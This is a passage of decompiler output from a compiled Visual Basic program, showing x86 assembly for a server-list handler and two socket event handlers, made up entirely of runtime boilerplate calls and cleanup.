  '00502442: lea edx, [ebp-00000130h]
  '00502448: push ecx
  '00502449: lea eax, [ebp-00000120h]
  '0050244F: push edx
  '00502450: lea ecx, [ebp-00000110h]
  '00502456: push eax
  '00502457: lea edx, [ebp-00000100h]
  '0050245D: push ecx
  '0050245E: push edx
  '0050245F: lea eax, [ebp-000000F0h]
  '00502465: lea ecx, [ebp-000000E0h]
  '0050246B: push eax
  '0050246C: lea edx, [ebp-000000D0h]
  '00502472: push ecx
  '00502473: lea eax, [ebp-000000C0h]
  '00502479: push edx
  '0050247A: lea ecx, [ebp-000000B0h]
  '00502480: push eax
  '00502481: lea edx, [ebp-000000A0h]
  '00502487: push ecx
  '00502488: lea eax, [ebp-00000090h]
  '0050248E: push edx
  '0050248F: push eax
  '00502490: push 00000011h
  '00502492: call [00401050h]
  '00502498: add esp, 00000048h
  '0050249B: ret 
End Sub
Private Sub lstServers__5024D0
  '005024D0: push ebp
  '005024D1: mov ebp, esp
  '005024D3: sub esp, 0000000Ch
  '005024D6: push 004081B6h
  '005024DB: mov eax, fs:[00h]
  '005024E1: push eax
  '005024E2: mov fs:[00000000h], esp
  '005024E9: sub esp, 00000030h
  '005024EC: push ebx
  '005024ED: push esi
  '005024EE: push edi
  '005024EF: mov [ebp-0Ch], esp
  '005024F2: mov [ebp-08h], 00405F80h
  '005024F9: mov esi, [ebp+08h]
  '005024FC: mov eax, esi
  '005024FE: and eax, 00000001h
  '00502501: mov [ebp-04h], eax
  '00502504: and esi, FFFFFFFEh
  '00502507: push esi
  '00502508: mov [ebp+08h], esi
  '0050250B: mov ecx, [esi]
  '0050250D: call [ecx+04h]
  '00502510: mov edx, [esi]
  '00502512: xor eax, eax
  '00502514: push esi
  '00502515: mov [ebp-18h], eax
  '00502518: mov [ebp-1Ch], eax
  '0050251B: mov [ebp-20h], eax
  '0050251E: mov [ebp-24h], eax
  '00502521: mov [ebp-3Ch], eax
  '00502524: call [edx+0000030Ch]
  '0050252A: mov ebx, [004010E4h]
  '00502530: push eax
  '00502531: lea eax, [ebp-1Ch]
  '00502534: push eax
  '00502535: call ebx
  '00502537: mov edi, eax
  '00502539: lea edx, [ebp-24h]
  '0050253C: push edx
  '0050253D: push edi
  '0050253E: mov ecx, [edi]
  '00502540: call [ecx+000000E0h]
  '00502546: test eax, eax
  '00502548: fclex 
  '0050254A: jnl 50255Eh
  '0050254C: push 000000E0h
  '00502551: push 0041FB8Ch
  '00502556: push edi
  '00502557: push eax
  '00502558: call [004010A0h]
  '0050255E: xor eax, eax
  '00502560: lea ecx, [ebp-1Ch]
  '00502563: cmp [ebp-24h], ax
  '00502567: setl al
  '0050256A: neg eax
  '0050256C: mov di, ax
  '0050256F: call [004013B8h]
  '00502575: test di, di
  '00502578: jnz 00502784h
  '0050257E: mov ecx, [esi]
  '00502580: push esi
  '00502581: call [ecx+000002B4h]
  '00502587: test eax, eax
  '00502589: fclex 
  '0050258B: jnl 50259Fh
  '0050258D: push 000002B4h
  '00502592: push 00422CA4h
  '00502597: push esi
  '00502598: push eax
  '00502599: call [004010A0h]
  '0050259F: mov eax, [541024h]
  '005025A4: test eax, eax
  '005025A6: jnz 5025B8h
  '005025A8: push 00541024h
  '005025AD: push 00413334h
  '005025B2: call [004012B8h]
  '005025B8: mov edx, [00541024h]
  '005025BE: lea eax, [ebp-3Ch]
  '005025C1: push edx
  '005025C2: push eax
  '005025C3: call [004010F8h]
  '005025C9: mov eax, [ebp-3Ch]
  '005025CC: push eax
  '005025CD: mov ecx, [eax]
  '005025CF: call [ecx+00000324h]
  '005025D5: lea edx, [ebp-20h]
  '005025D8: push eax
  '005025D9: push edx
  '005025DA: call ebx
  '005025DC: mov [ebp-34h], eax
  '005025DF: mov eax, [esi]
  '005025E1: push esi
  '005025E2: call [eax+0000030Ch]
  '005025E8: lea ecx, [ebp-1Ch]
  '005025EB: push eax
  '005025EC: push ecx
  '005025ED: call ebx
  '005025EF: mov edi, eax
  '005025F1: lea eax, [ebp-24h]
  '005025F4: push eax
  '005025F5: push edi
  '005025F6: mov edx, [edi]
  '005025F8: call [edx+000000E0h]
  '005025FE: test eax, eax
  '00502600: fclex 
  '00502602: jnl 502616h
  '00502604: push 000000E0h
  '00502609: push 0041FB8Ch
  '0050260E: push edi
  '0050260F: push eax
  '00502610: call [004010A0h]
  '00502616: mov eax, [esi+34h]
  '00502619: lea edx, [ebp-18h]
  '0050261C: push edx
  '0050261D: mov dx, [ebp-24h]
  '00502621: mov ecx, [eax]
  '00502623: add dx, 0001h
  '00502627: jo 005027D8h
  '0050262D: push edx
  '0050262E: push eax
  '0050262F: call [ecx+20h]
  '00502632: test eax, eax
  '00502634: fclex 
  '00502636: jnl 50264Ah
  '00502638: mov ecx, [esi+34h]
  '0050263B: push 00000020h
  '0050263D: push 004289C8h
  '00502642: push ecx
  '00502643: push eax
  '00502644: call [004010A0h]
  '0050264A: mov edi, [ebp-34h]
  '0050264D: mov eax, [ebp-18h]
  '00502650: push eax
  '00502651: push edi
  '00502652: mov edx, [edi]
  '00502654: call [edx+000000A4h]
  '0050265A: test eax, eax
  '0050265C: fclex 
  '0050265E: jnl 502672h
  '00502660: push 000000A4h
  '00502665: push 0041E3FCh
  '0050266A: push edi
  '0050266B: push eax
  '0050266C: call [004010A0h]
  '00502672: lea ecx, [ebp-18h]
  '00502675: call [004013B4h]
  '0050267B: lea ecx, [ebp-20h]
  '0050267E: lea edx, [ebp-1Ch]
  '00502681: push ecx
  '00502682: push edx
  '00502683: push 00000002h
  '00502685: call [00401064h]
  '0050268B: mov eax, [ebp-3Ch]
  '0050268E: add esp, 0000000Ch
  '00502691: mov ecx, [eax]
  '00502693: push eax
  '00502694: call [ecx+00000328h]
  '0050269A: lea edx, [ebp-20h]
  '0050269D: push eax
  '0050269E: push edx
  '0050269F: call ebx
  '005026A1: mov [ebp-34h], eax
  '005026A4: mov eax, [esi]
  '005026A6: push esi
  '005026A7: call [eax+0000030Ch]
  '005026AD: lea ecx, [ebp-1Ch]
  '005026B0: push eax
  '005026B1: push ecx
  '005026B2: call ebx
  '005026B4: mov edi, eax
  '005026B6: lea eax, [ebp-24h]
  '005026B9: push eax
  '005026BA: push edi
  '005026BB: mov edx, [edi]
  '005026BD: call [edx+000000E0h]
  '005026C3: test eax, eax
  '005026C5: fclex 
  '005026C7: jnl 5026DFh
  '005026C9: push 000000E0h
  '005026CE: push 0041FB8Ch
  '005026D3: push edi
  '005026D4: mov edi, [004010A0h]
  '005026DA: push eax
  '005026DB: call edi
  '005026DD: jmp 5026E5h
  '005026DF: mov edi, [004010A0h]
  '005026E5: mov eax, [esi+34h]
  '005026E8: lea edx, [ebp-18h]
  '005026EB: push edx
  '005026EC: mov dx, [ebp-24h]
  '005026F0: mov ecx, [eax]
  '005026F2: add dx, 0001h
  '005026F6: jo 005027D8h
  '005026FC: push edx
  '005026FD: push eax
  '005026FE: call [ecx+28h]
  '00502701: test eax, eax
  '00502703: fclex 
  '00502705: jnl 502715h
  '00502707: mov ecx, [esi+34h]
  '0050270A: push 00000028h
  '0050270C: push 004289C8h
  '00502711: push ecx
  '00502712: push eax
  '00502713: call edi
  '00502715: mov esi, [ebp-34h]
  '00502718: mov eax, [ebp-18h]
  '0050271B: push eax
  '0050271C: push esi
  '0050271D: mov edx, [esi]
  '0050271F: call [edx+000000A4h]
  '00502725: test eax, eax
  '00502727: fclex 
  '00502729: jnl 502739h
  '0050272B: push 000000A4h
  '00502730: push 0041E3FCh
  '00502735: push esi
  '00502736: push eax
  '00502737: call edi
  '00502739: lea ecx, [ebp-18h]
  '0050273C: call [004013B4h]
  '00502742: lea ecx, [ebp-20h]
  '00502745: lea edx, [ebp-1Ch]
  '00502748: push ecx
  '00502749: push edx
  '0050274A: push 00000002h
  '0050274C: call [00401064h]
  '00502752: mov eax, [ebp-3Ch]
  '00502755: add esp, 0000000Ch
  '00502758: mov ecx, [eax]
  '0050275A: push eax
  '0050275B: call [ecx+00000744h]
  '00502761: test eax, eax
  '00502763: fclex 
  '00502765: jnl 502778h
  '00502767: mov edx, [ebp-3Ch]
  '0050276A: push 00000744h
  '0050276F: push 0041C118h
  '00502774: push edx
  '00502775: push eax
  '00502776: call edi
  '00502778: lea eax, [ebp-3Ch]
  '0050277B: push 00000000h
  '0050277D: push eax
  '0050277E: call [004010F8h]
  '00502784: mov [ebp-04h], 00000000h
  '0050278B: push 005027B9h
  '00502790: jmp 5027AFh
  '00502792: lea ecx, [ebp-18h]
  '00502795: call [004013B4h]
  '0050279B: lea ecx, [ebp-20h]
  '0050279E: lea edx, [ebp-1Ch]
  '005027A1: push ecx
  '005027A2: push edx
  '005027A3: push 00000002h
  '005027A5: call [00401064h]
  '005027AB: add esp, 0000000Ch
  '005027AE: ret 
End Sub
Private Sub Sock__502A70
  '00502A70: push ebp
  '00502A71: mov ebp, esp
  '00502A73: sub esp, 0000000Ch
  '00502A76: push 004081B6h
  '00502A7B: mov eax, fs:[00h]
  '00502A81: push eax
  '00502A82: mov fs:[00000000h], esp
  '00502A89: sub esp, 00000090h
  '00502A8F: push ebx
  '00502A90: push esi
  '00502A91: push edi
  '00502A92: mov [ebp-0Ch], esp
  '00502A95: mov [ebp-08h], 00405FC8h
  '00502A9C: mov edi, [ebp+08h]
  '00502A9F: mov eax, edi
  '00502AA1: and eax, 00000001h
  '00502AA4: mov [ebp-04h], eax
  '00502AA7: and edi, FFFFFFFEh
  '00502AAA: push edi
  '00502AAB: mov [ebp+08h], edi
  '00502AAE: mov ecx, [edi]
  '00502AB0: call [ecx+04h]
  '00502AB3: mov edx, [ebp+18h]
  '00502AB6: mov ebx, [004012D8h]
  '00502ABC: xor esi, esi
  '00502ABE: lea ecx, [ebp-1Ch]
  '00502AC1: mov [ebp-18h], esi
  '00502AC4: mov [ebp-1Ch], esi
  '00502AC7: mov [ebp-20h], esi
  '00502ACA: mov [ebp-24h], esi
  '00502ACD: mov [ebp-28h], esi
  '00502AD0: mov [ebp-2Ch], esi
  '00502AD3: mov [ebp-3Ch], esi
  '00502AD6: mov [ebp-4Ch], esi
  '00502AD9: mov [ebp-5Ch], esi
  '00502ADC: mov [ebp-6Ch], esi
  '00502ADF: call ebx
  '00502AE1: mov edx, [ebp+1Ch]
  '00502AE4: lea ecx, [ebp-18h]
  '00502AE7: call ebx
  '00502AE9: mov edx, [ebp+0Ch]
  '00502AEC: mov ecx, 80020004h
  '00502AF1: mov eax, 0000000Ah
  '00502AF6: push 00428B5Ch
  '00502AFB: push edx
  '00502AFC: mov [ebp-54h], ecx
  '00502AFF: mov [ebp-5Ch], eax
  '00502B02: mov [ebp-44h], ecx
  '00502B05: mov [ebp-4Ch], eax
  '00502B08: call [0040100Ch]
  '00502B0E: mov edx, eax
  '00502B10: lea ecx, [ebp-20h]
  '00502B13: call [00401378h]
  '00502B19: push eax
  '00502B1A: call [0040108Ch]
  '00502B20: mov [ebp-34h], eax
  '00502B23: mov eax, [ebp+10h]
  '00502B26: lea ecx, [ebp-5Ch]
  '00502B29: mov [ebp-64h], eax
  '00502B2C: lea edx, [ebp-4Ch]
  '00502B2F: push ecx
  '00502B30: lea eax, [ebp-3Ch]
  '00502B33: push edx
  '00502B34: push eax
  '00502B35: lea ecx, [ebp-6Ch]
  '00502B38: push 00000010h
  '00502B3A: push ecx
  '00502B3B: mov [ebp-3Ch], 00000008h
  '00502B42: mov [ebp-6Ch], 00004008h
  '00502B49: call [004010E0h]
  '00502B4F: lea ecx, [ebp-20h]
  '00502B52: call [004013B4h]
  '00502B58: mov ebx, [00401050h]
  '00502B5E: lea edx, [ebp-5Ch]
  '00502B61: lea eax, [ebp-4Ch]
  '00502B64: push edx
  '00502B65: lea ecx, [ebp-3Ch]
  '00502B68: push eax
  '00502B69: push ecx
  '00502B6A: push 00000003h
  '00502B6C: call ebx
  '00502B6E: mov edx, [edi]
  '00502B70: add esp, 00000010h
  '00502B73: push 0041E958h
  '00502B78: push esi
  '00502B79: push 00000003h
  '00502B7B: push edi
  '00502B7C: call [edx+00000328h]
  '00502B82: push eax
  '00502B83: mov edi, [004010E4h]
  '00502B89: lea eax, [ebp-24h]
  '00502B8C: push eax
  '00502B8D: call edi
  '00502B8F: lea ecx, [ebp-3Ch]
  '00502B92: push eax
  '00502B93: push ecx
  '00502B94: call [004011E4h]
  '00502B9A: add esp, 00000010h
  '00502B9D: push eax
  '00502B9E: call [004011C8h]
  '00502BA4: lea edx, [ebp-28h]
  '00502BA7: push eax
  '00502BA8: push edx
  '00502BA9: call edi
  '00502BAB: mov edi, eax
  '00502BAD: lea ecx, [ebp-2Ch]
  '00502BB0: lea edx, [ebp-4Ch]
  '00502BB3: mov [ebp-44h], 00000001h
  '00502BBA: mov [ebp-4Ch], 00000002h
  '00502BC1: mov eax, [edi]
  '00502BC3: push ecx
  '00502BC4: push edx
  '00502BC5: push edi
  '00502BC6: call [eax+24h]
  '00502BC9: cmp eax, esi
  '00502BCB: fclex 
  '00502BCD: jnl 502BDEh
  '00502BCF: push 00000024h
  '00502BD1: push 0041E958h
  '00502BD6: push edi
  '00502BD7: push eax
  '00502BD8: call [004010A0h]
  '00502BDE: mov eax, [ebp-2Ch]
  '00502BE1: push 00428B8Ch
  '00502BE6: push eax
  '00502BE7: mov edi, eax
  '00502BE9: mov ecx, [eax]
  '00502BEB: call [ecx+00000080h]
  '00502BF1: cmp eax, esi
  '00502BF3: fclex 
  '00502BF5: jnl 502C09h
  '00502BF7: push 00000080h
  '00502BFC: push 0041E968h
  '00502C01: push edi
  '00502C02: push eax
  '00502C03: call [004010A0h]
  '00502C09: lea edx, [ebp-2Ch]
  '00502C0C: lea eax, [ebp-28h]
  '00502C0F: push edx
  '00502C10: lea ecx, [ebp-24h]
  '00502C13: push eax
  '00502C14: push ecx
  '00502C15: push 00000003h
  '00502C17: call [00401064h]
  '00502C1D: lea edx, [ebp-4Ch]
  '00502C20: lea eax, [ebp-3Ch]
  '00502C23: push edx
  '00502C24: push eax
  '00502C25: push 00000002h
  '00502C27: call ebx
  '00502C29: add esp, 0000001Ch
  '00502C2C: mov [ebp-04h], esi
  '00502C2F: push 00502C7Ch
  '00502C34: jmp 502C6Bh
  '00502C36: lea ecx, [ebp-20h]
  '00502C39: call [004013B4h]
  '00502C3F: lea ecx, [ebp-2Ch]
  '00502C42: lea edx, [ebp-28h]
  '00502C45: push ecx
  '00502C46: lea eax, [ebp-24h]
  '00502C49: push edx
  '00502C4A: push eax
  '00502C4B: push 00000003h
  '00502C4D: call [00401064h]
  '00502C53: lea ecx, [ebp-5Ch]
  '00502C56: lea edx, [ebp-4Ch]
  '00502C59: push ecx
  '00502C5A: lea eax, [ebp-3Ch]
  '00502C5D: push edx
  '00502C5E: push eax
  '00502C5F: push 00000003h
  '00502C61: call [00401050h]
  '00502C67: add esp, 00000020h
  '00502C6A: ret 
End Sub
Private Sub Sock__5027E0
  '005027E0: push ebp
  '005027E1: mov ebp, esp
  '005027E3: sub esp, 00000018h
  '005027E6: push 004081B6h
  '005027EB: mov eax, fs:[00h]
  '005027F1: push eax
  '005027F2: mov fs:[00000000h], esp
  '005027F9: mov eax, 00000094h
  '005027FE: call 004081B0h
  '00502803: push ebx
  '00502804: push esi
  '00502805: push edi
  '00502806: mov [ebp-18h], esp
  '00502809: mov [ebp-14h], 00405F90h
  '00502810: mov eax, [ebp+08h]
  '00502813: and eax, 00000001h
  '00502816: mov [ebp-10h], eax
  '00502819: mov ecx, [ebp+08h]
  '0050281C: and ecx, FFFFFFFEh
  '0050281F: mov [ebp+08h], ecx
  '00502822: mov [ebp-0Ch], 00000000h
  '00502829: mov edx, [ebp+08h]
  '0050282C: mov eax, [edx]
  '0050282E: mov ecx, [ebp+08h]
  '00502831: push ecx
  '00502832: call [eax+04h]
  '00502835: mov [ebp-04h], 00000001h
  '0050283C: mov [ebp-04h], 00000002h
  '00502843: push FFFFFFFFh
  '00502845: call [004010E8h]
  '0050284B: mov [ebp-04h], 00000003h
  '00502852: lea edx, [ebp-24h]
  '00502855: mov [ebp-58h], edx
  '00502858: mov [ebp-60h], 00004008h
  '0050285F: mov [ebp-68h], 00000008h
  '00502866: mov [ebp-70h], 00000003h
  '0050286D: mov eax, [ebp+0Ch]
  '00502870: mov [ebp-00000088h], eax
  '00502876: mov [ebp-00000090h], 00000003h
  '00502880: mov eax, 00000010h
  '00502885: call 004081B0h
  '0050288A: mov ecx, esp
  '0050288C: mov edx, [ebp-60h]
  '0050288F: mov [ecx], edx
  '00502891: mov eax, [ebp-5Ch]
  '00502894: mov [ecx+04h], eax
  '00502897: mov edx, [ebp-58h]
  '0050289A: mov [ecx+08h], edx
  '0050289D: mov eax, [ebp-54h]
  '005028A0: mov [ecx+0Ch], eax
  '005028A3: mov eax, 00000010h
  '005028A8: call 004081B0h
  '005028AD: mov ecx, esp
  '005028AF: mov edx, [ebp-70h]
  '005028B2: mov [ecx], edx
  '005028B4: mov eax, [ebp-6Ch]
  '005028B7: mov [ecx+04h], eax
  '005028BA: mov edx, [ebp-68h]
  '005028BD: mov [ecx+08h], edx
  '005028C0: mov eax, [ebp-64h]
  '005028C3: mov [ecx+0Ch], eax
  '005028C6: mov eax, 00000010h
  '005028CB: call 004081B0h
  '005028D0: mov ecx, esp
  '005028D2: mov edx, [ebp-00000090h]
  '005028D8: mov [ecx], edx
  '005028DA: mov eax, [ebp-0000008Ch]
  '005028E0: mov [ecx+04h], eax
  '005028E3: mov edx, [ebp-00000088h]
  '005028E9: mov [ecx+08h], edx
  '005028EC: mov eax, [ebp-00000084h]
  '005028F2: mov [ecx+0Ch], eax
  '005028F5: push 00000003h
  '005028F7: push 00000044h
  '005028F9: mov ecx, [ebp+08h]
  '005028FC: mov edx, [ecx]
  '005028FE: mov eax, [ebp+08h]
  '00502901: push eax
  '00502902: call [edx+00000324h]
  '00502908: push eax
  '00502909: lea ecx, [ebp-2Ch]
  '0050290C: push ecx
  '0050290D: call [004010E4h]
  '00502913: push eax
  '00502914: call [00401040h]
  '0050291A: add esp, 0000003Ch
  '0050291D: lea ecx, [ebp-2Ch]
  '00502920: call [004013B8h]
  '00502926: mov [ebp-04h], 00000004h
  '0050292D: push 00000000h
  '0050292F: push 8001000Bh
  '00502934: mov edx, [ebp+08h]
  '00502937: mov eax, [edx]
  '00502939: mov ecx, [ebp+08h]
  '0050293C: push ecx
  '0050293D: call [eax+00000324h]
  '00502943: push eax
  '00502944: lea edx, [ebp-2Ch]
  '00502947: push edx
  '00502948: call [004010E4h]
  '0050294E: push eax
  '0050294F: lea eax, [ebp-40h]
  '00502952: push eax
  '00502953: call [004011E4h]
  '00502959: add esp, 00000010h
  '0050295C: push eax
  '0050295D: call [0040103Ch]
  '00502963: mov edx, eax
  '00502965: lea ecx, [ebp-28h]
  '00502968: call [00401378h]
  '0050296E: push eax
  '0050296F: mov ecx, [ebp-24h]
  '00502972: push ecx
  '00502973: call [0040108Ch]
  '00502979: mov [ebp-48h], eax
  '0050297C: mov [ebp-50h], 00000008h
  '00502983: mov eax, 00000010h
  '00502988: call 004081B0h
  '0050298D: mov edx, esp
  '0050298F: mov eax, [ebp-50h]
  '00502992: mov [edx], eax
  '00502994: mov ecx, [ebp-4Ch]
  '00502997: mov [edx+04h], ecx
  '0050299A: mov eax, [ebp-48h]
  '0050299D: mov [edx+08h], eax
  '005029A0: mov ecx, [ebp-44h]
  '005029A3: mov [edx+0Ch], ecx
  '005029A6: push 8001000Bh
  '005029AB: mov edx, [ebp+08h]
  '005029AE: mov eax, [edx]
  '005029B0: mov ecx, [ebp+08h]
  '005029B3: push ecx
  '005029B4: call [eax+00000324h]
  '005029BA: push eax
  '005029BB: lea edx, [ebp-30h]
  '005029BE: push edx
  '005029BF: call [004010E4h]
  '005029C5: push eax
  '005029C6: call [0040139Ch]
  '005029CC: lea ecx, [ebp-28h]
  '005029CF: call [004013B4h]
  '005029D5: lea eax, [ebp-30h]
  '005029D8: push eax
  '005029D9: lea ecx, [ebp-2Ch]
  '005029DC: push ecx
  '005029DD: push 00000002h
  '005029DF: call [00401064h]
  '005029E5: add esp, 0000000Ch
  '005029E8: lea edx, [ebp-50h]
  '005029EB: push edx
  '005029EC: lea eax, [ebp-40h]
  '005029EF: push eax
  '005029F0: push 00000002h
  '005029F2: call [00401050h]
  '005029F8: add esp, 0000000Ch
  '005029FB: mov [ebp-10h], 00000000h
  '00502A02: push 00502A43h
  '00502A07: jmp 502A39h
  '00502A09: lea ecx, [ebp-28h]
  '00502A0C: call [004013B4h]
  '00502A12: lea ecx, [ebp-30h]
  '00502A15: push ecx
  '00502A16: lea edx, [ebp-2Ch]
  '00502A19: push edx
  '00502A1A: push 00000002h
  '00502A1C: call [00401064h]
  '00502A22: add esp, 0000000Ch
  '00502A25: lea eax, [ebp-50h]
  '00502A28: push eax
  '00502A29: lea ecx, [ebp-40h]
  '00502A2C: push ecx
  '00502A2D: push 00000002h
  '00502A2F: call [00401050h]
  '00502A35: add esp, 0000000Ch
  '00502A38: ret 
End Sub

